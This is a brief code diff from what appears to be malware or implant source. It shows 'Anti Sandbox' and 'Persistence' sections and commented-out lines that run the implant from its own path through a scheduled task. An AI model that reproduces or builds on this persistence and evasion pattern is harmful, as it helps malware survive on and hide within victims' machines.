@@ -39,8 +39,8 @@ int main()
 	// Anti Sandbox
 
 	// Persistence
-	wchar_t *pSelfImplantPath =  GetImplantPath();
-	int task_status = createScheduledTask(pSelfImplantPath, SysAllocString(L"15:30:00"));
+	//string pSelfImplantPath(GetImplantPath());
+	//int task_status = createScheduledTask(string_to_lpcwstr(pSelfImplantPath), SysAllocString(L"15:30:00"));
 
 	string privKey;
 	string pubKey;
